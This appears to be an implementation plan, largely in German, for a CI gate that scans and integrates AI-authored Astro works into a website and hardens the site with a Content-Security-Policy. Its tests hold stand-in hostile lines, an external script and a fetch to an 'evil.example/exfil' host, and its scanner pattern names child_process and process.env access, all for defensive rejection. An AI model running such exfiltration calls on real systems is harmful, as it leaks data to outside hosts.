# Erstklassige Atelier-Werke — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Ulysses kann vollwertige Astro-Werke im Haupt-Repo bauen, die nativ im Lab erscheinen — abgesichert durch ein Build-Gate, eine strukturelle Pfad-Grenze und eine Site-CSP.

**Architecture:** Ein testbares Integrations-Kernmodul (`src/lib/atelier/`) klassifiziert ihre Werke, prüft verbotene Muster und erzeugt Wrapper-Seiten. Ein CLI (`scripts/atelier/integrate.ts`) wendet es an; der Workflow `atelier-integrate.yml` validiert (`check && test && build`) und deployt nur bei Grün, sonst Feedback in ihr Repo + Issue an Frank. Eine Site-CSP (Astro-CSP-Hashes + `public/_headers`) härtet die Auslieferung.

**Tech Stack:** Astro 6.4.8, TypeScript, Vitest (`src/**/*.test.ts`), tsx (CLI), GitHub Actions, Cloudflare Pages.

## Global Constraints

- **Astro:** `^6.4.8`. **Node:** 22 (CI). **Paketmanager:** npm.
- **Tests:** Vitest, `npm test` (= `vitest run`), Include `src/**/*.test.ts`. Testbare Logik lebt unter `src/lib/atelier/`.
- **CLI:** ESM TypeScript via `tsx` (Muster: `scripts/fetch-climate.ts`).
- **Ulysses' Autoren-Fläche:** sie liefert pro Astro-Werk einen Ordner `works/<slug>/` mit `work.astro` (eine Astro-**Komponente**, KEIN Page-Layout) + `meta.json`; optionale Beigaben (`*.astro|*.ts|*.js|*.json|*.css|*.svg`). Das Gate stellt Route + Layout.
- **Pfad-Grenze (erlaubte Quell-Pfade in ihrem Repo):** `journal/**`, `works/<slug>/**` (nur erlaubte Dateitypen), `PROTOCOL.md`, `README.md`, `REQUESTS.md`. Alles andere wird ignoriert.
- **CSP:** `script-src 'self' https://static.cloudflareinsights.com` (+ Astro-Hashes), `connect-src 'self' https://cloudflareinsights.com`, `object-src 'none'`, `base-uri 'self'`, `frame-ancestors 'self'`. CF-Web-Analytics-Beacon muss weiter laden.
- **Secrets:** `GITHUB_TOKEN` (Commit + Issue in frankbueltge.de). **NEU:** `ATELIER_BOT_TOKEN` — fine-grained PAT mit `contents:write` auf `irrtum-als-methode` (Feedback-Datei). Frank legt es an.
- **Namens-Regel (verbindlich):** KEINE Referenz auf ein KI-Produkt/-Unternehmen — nicht in Commit-Messages, Branch-Namen, Autoren-Identität, Footer oder Code. Die KI heißt hier **Ulysses**. Kein Co-Author-Trailer. Commits zu Ulysses' eigener Arbeit als `Ulysses <ulysses@irrtum-als-methode.invalid>`; Team-/Infra-Commits unter Franks Identität.
- **Koexistenz:** HTML-Werke (iframe) bleiben unverändert. Nichts an bestehenden Werken migrieren.

---

### Task 1: Werk-Klassifikation & Pfad-Mapping

**Files:**
- Create: `src/lib/atelier/paths.ts`
- Test: `src/lib/atelier/paths.test.ts`

**Interfaces:**
- Produces:
  - `type WorkKind = 'html' | 'astro'`
  - `interface ClassifiedWork { slug: string; kind: WorkKind; files: string[] }`
  - `interface RejectedWork { slug: string; kind: null; reason: string }`
  - `function classifyWork(slug: string, fileNames: string[]): ClassifiedWork | RejectedWork`
  - `interface FileMap { from: string; to: string }`
  - `function siteTargets(work: ClassifiedWork): FileMap[]` — `from` ist relativ zu `works/<slug>/`, `to` relativ zum Site-Root.

- [ ] **Step 1: Write the failing test**

```ts
// src/lib/atelier/paths.test.ts
import { describe, it, expect } from 'vitest'
import { classifyWork, siteTargets } from './paths'

describe('classifyWork', () => {
  it('classifies an astro work', () => {
    expect(classifyWork('drei', ['work.astro', 'meta.json'])).toEqual({
      slug: 'drei', kind: 'astro', files: ['work.astro', 'meta.json'],
    })
  })
  it('classifies an html work', () => {
    expect(classifyWork('alt', ['index.html', 'meta.json'])).toEqual({
      slug: 'alt', kind: 'html', files: ['index.html', 'meta.json'],
    })
  })
  it('rejects a work with a disallowed file type', () => {
    const r = classifyWork('bad', ['work.astro', 'evil.sh'])
    expect(r.kind).toBeNull()
    expect((r as any).reason).toMatch(/evil\.sh/)
  })
  it('rejects a work without index.html or work.astro', () => {
    expect(classifyWork('empty', ['meta.json']).kind).toBeNull()
  })
})

describe('siteTargets', () => {
  it('maps an astro work dir into the components tree', () => {
    const w = { slug: 'drei', kind: 'astro' as const, files: ['work.astro', 'meta.json', 'data.json'] }
    expect(siteTargets(w)).toEqual([
      { from: 'work.astro', to: 'src/components/atelier/werke/drei/index.astro' },
      { from: 'meta.json',  to: 'src/components/atelier/werke/drei/meta.json' },
      { from: 'data.json',  to: 'src/components/atelier/werke/drei/data.json' },
    ])
  })
  it('maps an html work into the content tree', () => {
    const w = { slug: 'alt', kind: 'html' as const, files: ['index.html', 'meta.json'] }
    expect(siteTargets(w)).toEqual([
      { from: 'index.html', to: 'src/content/atelier/works/alt/index.html' },
      { from: 'meta.json',  to: 'src/content/atelier/works/alt/meta.json' },
    ])
  })
})
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npx vitest run src/lib/atelier/paths.test.ts`
Expected: FAIL — `Cannot find module './paths'`.

- [ ] **Step 3: Write minimal implementation**

```ts
// src/lib/atelier/paths.ts
export type WorkKind = 'html' | 'astro'
export interface ClassifiedWork { slug: string; kind: WorkKind; files: string[] }
export interface RejectedWork { slug: string; kind: null; reason: string }
export interface FileMap { from: string; to: string }

const ALLOWED_EXT = /\.(astro|ts|js|json|css|svg|html)$/

export function classifyWork(slug: string, fileNames: string[]): ClassifiedWork | RejectedWork {
  const bad = fileNames.find((f) => !ALLOWED_EXT.test(f))
  if (bad) return { slug, kind: null, reason: `disallowed file type: ${bad}` }
  if (fileNames.includes('work.astro')) return { slug, kind: 'astro', files: fileNames }
  if (fileNames.includes('index.html')) return { slug, kind: 'html', files: fileNames }
  return { slug, kind: null, reason: 'no work.astro or index.html' }
}

export function siteTargets(work: ClassifiedWork): FileMap[] {
  if (work.kind === 'html') {
    return work.files.map((f) => ({ from: f, to: `src/content/atelier/works/${work.slug}/${f}` }))
  }
  // astro: whole dir → components/atelier/werke/<slug>/, work.astro → index.astro
  return work.files.map((f) => ({
    from: f,
    to: `src/components/atelier/werke/${work.slug}/${f === 'work.astro' ? 'index.astro' : f}`,
  }))
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `npx vitest run src/lib/atelier/paths.test.ts`
Expected: PASS (6 tests).

- [ ] **Step 5: Commit**

```bash
git add src/lib/atelier/paths.ts src/lib/atelier/paths.test.ts
git commit -m "feat(atelier): Werk-Klassifikation + Pfad-Mapping"
```

---

### Task 2: Verbotene-Muster-Prüfung

**Files:**
- Create: `src/lib/atelier/forbidden.ts`
- Test: `src/lib/atelier/forbidden.test.ts`

**Interfaces:**
- Produces: `function checkForbidden(source: string): string[]` — Liste der Verstöße (leer = sauber). Prüft Server-/Node-Zugriff und externe Lade-/Sende-/Navigationsmuster im Quelltext einer `.astro|.ts|.js`-Datei.

- [ ] **Step 1: Write the failing test**

```ts
// src/lib/atelier/forbidden.test.ts
import { describe, it, expect } from 'vitest'
import { checkForbidden } from './forbidden'

describe('checkForbidden', () => {
  it('passes clean work that imports a committed dataset', () => {
    const src = `---\nimport data from '@/data/climate/gistemp.json'\n---\n<canvas></canvas>`
    expect(checkForbidden(src)).toEqual([])
  })
  it('flags node fs / process access', () => {
    expect(checkForbidden(`import fs from 'node:fs'`)).toContain("node/fs/process access: node:fs")
    expect(checkForbidden(`const x = process.env.SECRET`)).toContain('node/fs/process access: process.env')
  })
  it('flags external script src', () => {
    expect(checkForbidden(`<script src="https://evil.example/x.js"></script>`))
      .toContain('external resource: https://evil.example/x.js')
  })
  it('flags external fetch and navigation', () => {
    expect(checkForbidden(`fetch('https://evil.example/exfil')`)).toContain('external resource: https://evil.example/exfil')
    expect(checkForbidden(`window.location = 'https://evil.example'`)).toContain('navigation: window.location')
  })
})
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npx vitest run src/lib/atelier/forbidden.test.ts`
Expected: FAIL — `Cannot find module './forbidden'`.

- [ ] **Step 3: Write minimal implementation**

```ts
// src/lib/atelier/forbidden.ts
export function checkForbidden(source: string): string[] {
  const out: string[] = []
  const node = source.match(/\b(node:fs|node:child_process|child_process|process\.env|process\.exit)\b/g)
  if (node) for (const m of new Set(node)) out.push(`node/fs/process access: ${m}`)
  // bare fs import: import ... from 'fs'
  if (/from\s+['"]fs['"]/.test(source)) out.push('node/fs/process access: fs')
  // external URLs (anything not same-origin / not @/ alias)
  const urls = source.match(/https?:\/\/[^\s"'`)]+/g)
  if (urls) for (const u of new Set(urls)) {
    if (!/(?:^|\.)w3\.org|schema\.org/.test(u)) out.push(`external resource: ${u}`) // xmlns/schema ok
  }
  if (/\b(window\.location|location\.href|location\.assign|location\.replace)\b/.test(source))
    out.push('navigation: window.location')
  return out
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `npx vitest run src/lib/atelier/forbidden.test.ts`
Expected: PASS (4 tests).

- [ ] **Step 5: Commit**

```bash
git add src/lib/atelier/forbidden.ts src/lib/atelier/forbidden.test.ts
git commit -m "feat(atelier): Prüfung auf verbotene Muster (fs/process/extern/Navigation)"
```

---

### Task 3: Wrapper-Seiten-Generator

**Files:**
- Create: `src/lib/atelier/wrapper.ts`
- Test: `src/lib/atelier/wrapper.test.ts`

**Interfaces:**
- Consumes: nichts.
- Produces: `function renderWrapperPage(slug: string, meta: { title?: string; verkoerpert?: string }): string` — erzeugt den `.astro`-Quelltext der statischen Wrapper-Seite, die die Werk-Komponente in das `Page`-Layout hängt.

- [ ] **Step 1: Write the failing test**

```ts
// src/lib/atelier/wrapper.test.ts
import { describe, it, expect } from 'vitest'
import { renderWrapperPage } from './wrapper'

describe('renderWrapperPage', () => {
  it('imports the work component and meta and wraps in Page', () => {
    const out = renderWrapperPage('drei-maschinen', { title: 'Drei Maschinen', verkoerpert: 'X' })
    expect(out).toContain("import Page from '@/layouts/Page.astro'")
    expect(out).toContain("import Work from '@/components/atelier/werke/drei-maschinen/index.astro'")
    expect(out).toContain("import meta from '@/components/atelier/werke/drei-maschinen/meta.json'")
    expect(out).toContain('<Work />')
    expect(out).toContain('<Page')
  })
  it('escapes nothing into code (slug is path-segment safe)', () => {
    expect(() => renderWrapperPage('a/b', {})).toThrow(/slug/)
  })
})
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npx vitest run src/lib/atelier/wrapper.test.ts`
Expected: FAIL — `Cannot find module './wrapper'`.

- [ ] **Step 3: Write minimal implementation**

```ts
// src/lib/atelier/wrapper.ts
export function renderWrapperPage(slug: string, _meta: { title?: string; verkoerpert?: string }): string {
  if (!/^[a-z0-9-]+$/.test(slug)) throw new Error(`unsafe slug: ${slug}`)
  return `---
import Page from '@/layouts/Page.astro'
import Work from '@/components/atelier/werke/${slug}/index.astro'
import meta from '@/components/atelier/werke/${slug}/meta.json'
const title = \`\${meta.title ?? '${slug}'} — Atelier | Frank Bültge\`
---
<Page title={title} description={meta.verkoerpert ?? meta.title ?? '${slug}'}>
  <main id="main" class="mx-auto max-w-3xl px-4 py-14">
    <Work />
  </main>
</Page>
`
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `npx vitest run src/lib/atelier/wrapper.test.ts`
Expected: PASS (2 tests).

- [ ] **Step 5: Commit**

```bash
git add src/lib/atelier/wrapper.ts src/lib/atelier/wrapper.test.ts
git commit -m "feat(atelier): Wrapper-Seiten-Generator für Astro-Werke"
```

---

### Task 4: Integrations-Orchestrator + CLI

**Files:**
- Create: `src/lib/atelier/integrate.ts`
- Test: `src/lib/atelier/integrate.test.ts`
- Create: `scripts/atelier/integrate.ts` (CLI-Wrapper)

**Interfaces:**
- Consumes: `classifyWork`, `siteTargets` (Task 1), `checkForbidden` (Task 2), `renderWrapperPage` (Task 3).
- Produces:
  - `interface IntegrateReport { accepted: { slug: string; kind: 'html'|'astro' }[]; rejected: { slug: string; reason: string }[] }`
  - `function integrate(opts: { sourceDir: string; siteDir: string }): IntegrateReport` — liest `<sourceDir>/works/*`, mappt erlaubte Dateien nach `<siteDir>`, scannt Astro-Werke auf verbotene Muster (Reject → nicht kopieren), schreibt Wrapper-Seiten nach `src/pages/atelier/werke/<slug>.astro`. Kopiert KEINE Build-Config/Workflows/fremden Code (nur die in Task 1 definierten Ziele).

- [ ] **Step 1: Write the failing test**

```ts
// src/lib/atelier/integrate.test.ts
import { describe, it, expect, beforeEach, afterEach } from 'vitest'
import { mkdtempSync, mkdirSync, writeFileSync, rmSync, existsSync, readFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { integrate } from './integrate'

let src: string, site: string
beforeEach(() => {
  src = mkdtempSync(join(tmpdir(), 'atelier-src-'))
  site = mkdtempSync(join(tmpdir(), 'atelier-site-'))
  const mk = (p: string, c: string) => { mkdirSync(join(src, p, '..'), { recursive: true }); writeFileSync(join(src, p), c) }
  mk('works/good/work.astro', `---\nimport d from '@/data/climate/gistemp.json'\n---\n<p>ok</p>`)
  mk('works/good/meta.json', JSON.stringify({ title: 'Good', verkoerpert: 'v' }))
  mk('works/evil/work.astro', `<script src="https://evil.example/x.js"></script>`)
  mk('works/evil/meta.json', JSON.stringify({ title: 'Evil' }))
})
afterEach(() => { rmSync(src, { recursive: true, force: true }); rmSync(site, { recursive: true, force: true }) })

describe('integrate', () => {
  it('accepts a clean astro work and writes component + wrapper page', () => {
    const r = integrate({ sourceDir: src, siteDir: site })
    expect(r.accepted).toContainEqual({ slug: 'good', kind: 'astro' })
    expect(existsSync(join(site, 'src/components/atelier/werke/good/index.astro'))).toBe(true)
    expect(existsSync(join(site, 'src/components/atelier/werke/good/meta.json'))).toBe(true)
    expect(existsSync(join(site, 'src/pages/atelier/werke/good.astro'))).toBe(true)
    expect(readFileSync(join(site, 'src/pages/atelier/werke/good.astro'), 'utf8')).toContain('<Work />')
  })
  it('rejects a work with an external script and does not copy it', () => {
    const r = integrate({ sourceDir: src, siteDir: site })
    expect(r.rejected.find((x) => x.slug === 'evil')?.reason).toMatch(/external resource/)
    expect(existsSync(join(site, 'src/components/atelier/werke/evil/index.astro'))).toBe(false)
  })
})
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npx vitest run src/lib/atelier/integrate.test.ts`
Expected: FAIL — `Cannot find module './integrate'`.

- [ ] **Step 3: Write minimal implementation**

```ts
// src/lib/atelier/integrate.ts
import { readdirSync, statSync, mkdirSync, copyFileSync, writeFileSync, readFileSync, existsSync } from 'node:fs'
import { join, dirname } from 'node:path'
import { classifyWork, siteTargets } from './paths'
import { checkForbidden } from './forbidden'
import { renderWrapperPage } from './wrapper'

export interface IntegrateReport {
  accepted: { slug: string; kind: 'html' | 'astro' }[]
  rejected: { slug: string; reason: string }[]
}

const CODE_EXT = /\.(astro|ts|js)$/

export function integrate(opts: { sourceDir: string; siteDir: string }): IntegrateReport {
  const report: IntegrateReport = { accepted: [], rejected: [] }
  const worksDir = join(opts.sourceDir, 'works')
  if (!existsSync(worksDir)) return report
  for (const slug of readdirSync(worksDir)) {
    const dir = join(worksDir, slug)
    if (!statSync(dir).isDirectory()) continue
    const files = readdirSync(dir)
    const work = classifyWork(slug, files)
    if (work.kind === null) { report.rejected.push({ slug, reason: work.reason }); continue }
    // forbidden-scan all code files of astro works
    if (work.kind === 'astro') {
      const violations: string[] = []
      for (const f of files.filter((f) => CODE_EXT.test(f)))
        violations.push(...checkForbidden(readFileSync(join(dir, f), 'utf8')))
      if (violations.length) { report.rejected.push({ slug, reason: violations.join('; ') }); continue }
    }
    for (const { from, to } of siteTargets(work)) {
      const dest = join(opts.siteDir, to)
      mkdirSync(dirname(dest), { recursive: true })
      copyFileSync(join(dir, from), dest)
    }
    if (work.kind === 'astro') {
      const meta = JSON.parse(readFileSync(join(dir, 'meta.json'), 'utf8'))
      const page = join(opts.siteDir, `src/pages/atelier/werke/${slug}.astro`)
      mkdirSync(dirname(page), { recursive: true })
      writeFileSync(page, renderWrapperPage(slug, meta))
    }
    report.accepted.push({ slug, kind: work.kind })
  }
  return report
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `npx vitest run src/lib/atelier/integrate.test.ts`
Expected: PASS (2 tests).

- [ ] **Step 5: Write the CLI wrapper**

```ts
// scripts/atelier/integrate.ts
// Usage: tsx scripts/atelier/integrate.ts <sourceDir> <siteDir>
// Prints the JSON report to stdout; exit 0 always (the workflow decides on rejects/build).
import { integrate } from '../../src/lib/atelier/integrate'

const [sourceDir, siteDir] = process.argv.slice(2)
if (!sourceDir || !siteDir) { console.error('usage: integrate <sourceDir> <siteDir>'); process.exit(2) }
const report = integrate({ sourceDir, siteDir })
console.log(JSON.stringify(report, null, 2))
```

- [ ] **Step 6: Smoke-test the CLI**

Run: `npx tsx scripts/atelier/integrate.ts /tmp/nonexistent .` 
Expected: prints `{ "accepted": [], "rejected": [] }` (no `works/` → empty report), exit 0.

- [ ] **Step 7: Commit**

```bash
git add src/lib/atelier/integrate.ts src/lib/atelier/integrate.test.ts scripts/atelier/integrate.ts
git commit -m "feat(atelier): Integrations-Orchestrator + CLI"
```

---

### Task 5: Workflow `atelier-integrate.yml` (Gate) + deploy-cf-Umbenennung

**Files:**
- Create: `.github/workflows/atelier-integrate.yml`
- Delete: `.github/workflows/atelier-sync.yml`
- Modify: `.github/workflows/deploy-cf.yml` (workflow_run-Liste: „Atelier sync" → „Atelier integrate")

**Interfaces:**
- Consumes: `scripts/atelier/integrate.ts` (Task 4).
- Voraussetzung (Frank-Aktion): Repo-Secret `ATELIER_BOT_TOKEN` (fine-grained PAT, `contents:write` auf `irrtum-als-methode`).

- [ ] **Step 1: Frank legt das Secret an**

frankbueltge.de → Settings → Secrets and variables → Actions → New repository secret:
`ATELIER_BOT_TOKEN` = fine-grained PAT, Resource owner `frankbueltge`, nur Repo `irrtum-als-methode`, Permissions: `Contents: Read and write`. (Plan-Schritt als Hinweis; der Workflow funktioniert ohne das Secret für den Grün-Pfad, nur die Feedback-Datei bei Rot braucht es.)

- [ ] **Step 2: Write the workflow**

```yaml
# .github/workflows/atelier-integrate.yml
# Zieht Ulysses' Atelier-Repo, integriert NUR erlaubte Pfade (Pfad-Grenze), validiert
# check/test/build und deployt nur bei Grün. Bei Rot: kein Deploy (letzter Stand bleibt),
# Feedback-Datei zurück in ihr Repo + Issue an Frank. v1 ist all-or-nothing (ein rotes
# Astro-Werk hält auch den Journal-Commit der Nacht zurück; sie bekommt Feedback und behebt
# es). Refinement (Journal/HTML immer, nur Astro gated) ist als Folgeausbau notiert.
name: Atelier integrate

on:
  schedule:
    - cron: '0 3 * * *'   # 05:00 Berlin — nach Auto-Land (02:00 UTC)
  workflow_dispatch: {}

permissions:
  contents: write
  issues: write

concurrency:
  group: atelier-integrate

jobs:
  integrate:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 22
      - run: npm ci

      - name: Clone atelier repo
        run: git clone --depth 1 https://github.com/frankbueltge/irrtum-als-methode /tmp/atelier

      - name: Integrate works (html + astro) + sync journal/docs
        run: |
          mkdir -p src/content/atelier/journal src/content/atelier/works
          rsync -a --delete /tmp/atelier/journal/ src/content/atelier/journal/
          # Integrator mappt NUR erlaubte Pfade: HTML-Werke → content, Astro-Werke →
          # components + generierte Wrapper-Seiten; Rejects werden nicht kopiert.
          npx tsx scripts/atelier/integrate.ts /tmp/atelier . > /tmp/report.json
          cat /tmp/report.json
          for f in PROTOCOL.md README.md REQUESTS.md; do [ -f "/tmp/atelier/$f" ] && cp "/tmp/atelier/$f" "src/content/atelier/$f" || true; done

      - name: Validate (check + test + build)
        id: validate
        run: |
          set -o pipefail
          { npm run check && npm test && npm run build; } 2>&1 | tee /tmp/validate.log

      - name: Commit + let deploy-cf rebuild (on success)
        if: success()
        run: |
          if [ -n "$(git status --porcelain src/content/atelier src/components/atelier src/pages/atelier)" ]; then
            git config user.name "Atelier-Integrate"
            git config user.email "atelier-integrate@users.noreply.github.com"
            git add src/content/atelier src/components/atelier src/pages/atelier
            git commit -m "atelier: integrate $(date -u +%F)"
            git push
          else
            echo "no changes"
          fi

      - name: On failure — feedback to her repo + issue to Frank
        if: failure()
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          BOT_TOKEN: ${{ secrets.ATELIER_BOT_TOKEN }}
        run: |
          DATE=$(date -u +%F)
          LOG=$(tail -40 /tmp/validate.log 2>/dev/null || echo "see workflow run")
          # Feedback in IHR Repo (sie liest es nächste Sitzung)
          if [ -n "$BOT_TOKEN" ]; then
            git clone --depth 1 "https://x-access-token:${BOT_TOKEN}@github.com/frankbueltge/irrtum-als-methode" /tmp/fb
            mkdir -p /tmp/fb/atelier-feedback
            printf '# Build-Feedback %s\n\nDein letzter Beitrag hat das Gate nicht bestanden (kein Deploy; letzter guter Stand bleibt live). Auszug:\n\n```\n%s\n```\n\nKorrigiere das betroffene Werk in `works/<slug>/` und committe erneut.\n' "$DATE" "$LOG" > "/tmp/fb/atelier-feedback/${DATE}.md"
            cd /tmp/fb && git config user.name "Atelier-Integrate" && git config user.email "atelier-integrate@users.noreply.github.com"
            git add atelier-feedback && git commit -m "feedback: Build $DATE rot" && git push || echo "feedback push skipped"
            cd "$GITHUB_WORKSPACE"
          fi
          # Issue an Frank (im Site-Repo)
          gh issue create --repo frankbueltge/frankbueltge.de \
            --title "Atelier-Integrate rot ($DATE)" \
            --body "Der nächtliche Atelier-Build ist fehlgeschlagen; kein Deploy. Log-Auszug im Workflow-Lauf. Feedback wurde in irrtum-als-methode/atelier-feedback/${DATE}.md geschrieben." || true
```

- [ ] **Step 3: Delete the old sync workflow**

```bash
git rm .github/workflows/atelier-sync.yml
```

- [ ] **Step 4: Rename the trigger in deploy-cf.yml**

In `.github/workflows/deploy-cf.yml`, unter `workflow_run:` → `workflows:`, die Zeile `- Atelier sync` ersetzen durch `- Atelier integrate`.

- [ ] **Step 5: Validate YAML locally**

Run: `npx --yes js-yaml .github/workflows/atelier-integrate.yml > /dev/null && echo OK`
Expected: `OK` (gültiges YAML).

- [ ] **Step 6: Commit**

```bash
git add .github/workflows/atelier-integrate.yml .github/workflows/deploy-cf.yml
git rm --cached .github/workflows/atelier-sync.yml 2>/dev/null || true
git commit -m "feat(atelier): Integrations-Gate ersetzt Sync (build-grün → live, sonst Feedback)"
```

---

### Task 6: `/atelier`-Galerie — native Astro-Werke-Sektion

**Files:**
- Modify: `src/components/pages/AtelierPage.astro`
- Create: `src/components/atelier/werke/.gitkeep` (damit der Glob-Pfad existiert)

**Interfaces:**
- Consumes: integrierte Werke unter `src/components/atelier/werke/<slug>/meta.json` + Wrapper-Seiten `/atelier/werke/<slug>`.

- [ ] **Step 1: Add the native-works section to AtelierPage**

In `src/components/pages/AtelierPage.astro`, im Frontmatter nach den bestehenden `htmlRaw`/`metaRaw`-Globs ergänzen:

```ts
// Native Astro-Werke: nur Metadaten (gerendert werden sie als eigene Seiten /atelier/werke/<slug>)
const nativeMeta = import.meta.glob('/src/components/atelier/werke/*/meta.json', {
  eager: true, import: 'default',
}) as Record<string, any>
const native = Object.entries(nativeMeta)
  .map(([path, meta]) => ({ slug: path.replace('/src/components/atelier/werke/', '').replace('/meta.json', ''), meta }))
  .sort((a, b) => String(b.meta.date ?? b.slug).localeCompare(String(a.meta.date ?? a.slug)))
```

Und im Markup, **vor** der bestehenden `{interactive.length > 0 && (` -Sektion, eine neue Sektion einfügen:

```astro
{native.length > 0 && (
  <section class="mb-16">
    <h2 class="mb-5 font-mono text-xs uppercase tracking-widest text-fg-faint">{de ? 'Werke' : 'Works'}</h2>
    <ul class="divide-y divide-line/60 border-t border-line/60">
      {native.map(({ slug, meta }) => (
        <li class="py-6">
          <a href={`/atelier/werke/${slug}`} class="group block">
            <h3 class="text-lg font-semibold transition-colors group-hover:text-accent-soft">
              {meta.title ?? slug}
              {meta.date && <span class="ml-2 font-mono text-xs font-normal text-fg-faint">{meta.date}</span>}
            </h3>
            {meta.verkoerpert && <p class="mt-1.5 text-sm leading-relaxed text-fg-muted">{meta.verkoerpert}</p>}
          </a>
        </li>
      ))}
    </ul>
  </section>
)}
```

Außerdem die Überschrift der bestehenden iframe-Sektion (`txt.interactiveH`) ggf. zu „Interaktive HTML-Werke" / „Interactive HTML works" präzisieren (Abgrenzung zu den nativen Werken).

- [ ] **Step 2: Create the glob anchor**

```bash
mkdir -p src/components/atelier/werke && touch src/components/atelier/werke/.gitkeep
```

- [ ] **Step 3: Build to verify zero-state + no errors**

Run: `npm run build`
Expected: Build PASS; `/atelier` und `/de/atelier` bauen (native-Sektion ist leer/versteckt, solange keine Astro-Werke integriert sind).

- [ ] **Step 4: Commit**

```bash
git add src/components/pages/AtelierPage.astro src/components/atelier/werke/.gitkeep
git commit -m "feat(atelier): Galerie listet native Astro-Werke (Link zu /atelier/werke/<slug>)"
```

---

### Task 7: Site-CSP (Astro-CSP-Hashes + `public/_headers`)

**Files:**
- Modify: `astro.config.mjs`
- Create: `public/_headers`

**Interfaces:** keine Code-Interfaces; Verifikation per Browser-Konsole.

- [ ] **Step 1: Inventur bestätigen**

Bekannte Skript-Quellen (aus Base.astro): 3× inline `<script type="application/ld+json" set:html>` (dynamisch, pro Seite), 1× gebündeltes Modul (Lenis, `'self'`), Cloudflare-Web-Analytics-Beacon (extern, `static.cloudflareinsights.com`, Beacon → `cloudflareinsights.com`), self-hosted Fonts (`'self'`/`data:`). Ulysses' Werke: gebündeltes JS = `'self'`.

- [ ] **Step 2: Enable Astro CSP with hashes + allowlist**

In `astro.config.mjs`, im `defineConfig({…})` ergänzen (Astro 6 hasht bekannte inline/gebündelte Skripte automatisch; externe Quellen + Härtungs-Direktiven manuell):

```js
  // Content-Security-Policy: Astro hasht eigene inline/gebündelte Skripte (kein 'unsafe-inline');
  // extern nur der Cloudflare-Analytics-Beacon. Härtet die ganze Seite (auch Ateliers Werke).
  experimental: {
    csp: {
      directives: [
        "default-src 'self'",
        "img-src 'self' data:",
        "font-src 'self' data:",
        "style-src 'self' 'unsafe-inline'",
        "connect-src 'self' https://cloudflareinsights.com",
        "object-src 'none'",
        "base-uri 'self'",
      ],
      scriptDirective: {
        resources: ["'self'", 'https://static.cloudflareinsights.com'],
      },
    },
  },
```

> **Hinweis für den Umsetzer:** Die exakte Astro-6-CSP-API verifizieren (`astro`-Doku zu CSP; ggf. ist `csp` bereits stabil statt unter `experimental`). Ziel: `script-src` enthält Astro-Hashes + `'self'` + `static.cloudflareinsights.com`, **ohne** `'unsafe-inline'` für Skripte. `style-src 'unsafe-inline'` ist ok (Tailwind/Inline-Styles, kein Skript-Risiko).

- [ ] **Step 3: Add header-only directives via `public/_headers`**

```
# public/_headers — Cloudflare Pages. frame-ancestors (nicht via <meta> möglich) + Klickjacking.
/*
  X-Frame-Options: SAMEORIGIN
  X-Content-Type-Options: nosniff
  Referrer-Policy: strict-origin-when-cross-origin
  Content-Security-Policy: frame-ancestors 'self'
```

- [ ] **Step 4: Build + verify no CSP regressions**

Run: `npm run build && npm run preview` (dann lokal `/`, `/protokoll`, `/atelier` öffnen)
Expected: Build PASS; in der Browser-Konsole **keine** CSP-Verstöße auf den Bestandsseiten; JSON-LD im `<head>` vorhanden; (CF-Analytics lädt erst auf der echten CF-Pages-Domain — lokal nicht prüfbar, daher in Direktiven bereits erlaubt).

- [ ] **Step 5: Commit**

```bash
git add astro.config.mjs public/_headers
git commit -m "feat(security): Site-CSP (Astro-Hashes, script-src 'self' + CF-Insights), Härtungs-Header"
```

---

### Task 8: Ulysses' Repo — SITE-API.md, Beispielwerk, PROTOCOL-Abschnitt

**Files (im Repo `irrtum-als-methode`, separater Checkout):**
- Create: `SITE-API.md`
- Create: `works/2026-06-30-beispiel-erstklassig/work.astro`
- Create: `works/2026-06-30-beispiel-erstklassig/meta.json`
- Modify: `PROTOCOL.md` (neuer Abschnitt „Erstklassige Werke")

**Interfaces:** Dokumentation; muss zur Pfad-/Mapping-Konvention aus Tasks 1/3 passen.

- [ ] **Step 1: Write SITE-API.md**

Inhalt (Kurzreferenz): erlaubte Werkform (`works/<slug>/work.astro` = Astro-**Komponente**, kein Layout); verfügbare Imports (`@/layouts/Page.astro` stellt das Gate selbst — sie importiert es NICHT; sie darf `@/components/...` lesende Bausteine und `@/data/*`/`@/content/*`-Datensätze importieren); Liste der committeten Datensätze (`src/data/{climate,parallaxe,praemie,consensus,ghost-fleet,redaction,round-number,pattern,tell,ueberflug,revision,halbwertszeit}`, `src/content/{protokoll,lab}`) mit je einer Zeile Shape; Regeln (kein `fs`/`process`, keine externen Script-/Fetch-URLs, keine `window.location`-Navigation — sonst Reject; Daten inline oder als `./data.json` relativ); was bei Rot passiert (Feedback in `atelier-feedback/<datum>.md`).

- [ ] **Step 2: Write the example work**

```astro
---
// works/2026-06-30-beispiel-erstklassig/work.astro
// Beispiel: liest einen committeten Datensatz zur Build-Zeit, rendert statisch.
import gistemp from '@/data/climate/gistemp.json'
const points = (gistemp as any).series?.slice(-12) ?? []
---
<section class="font-mono">
  <h1 class="text-2xl font-bold">Beispiel — erstklassig</h1>
  <p class="mt-2 text-fg-muted">Build-Zeit-Daten, kein Netz, deterministisch.</p>
  <ul class="mt-4 text-sm">{points.map((p: any) => <li>{JSON.stringify(p)}</li>)}</ul>
</section>
```

```json
{
  "title": "Beispiel — erstklassig",
  "date": "2026-06-30",
  "author": "Ulysses",
  "medium": "Astro/SSG, committete Daten",
  "verkoerpert": "Referenz-Skelett: zeigt, wie ein natives Werk committete Daten zur Build-Zeit liest."
}
```

> **Hinweis:** `gistemp.json`-Shape vor Commit gegen `src/data/climate/` im Site-Repo prüfen; den `.slice(-12)`-Zugriff an die echte Struktur anpassen, damit das Beispiel das Gate grün passiert.

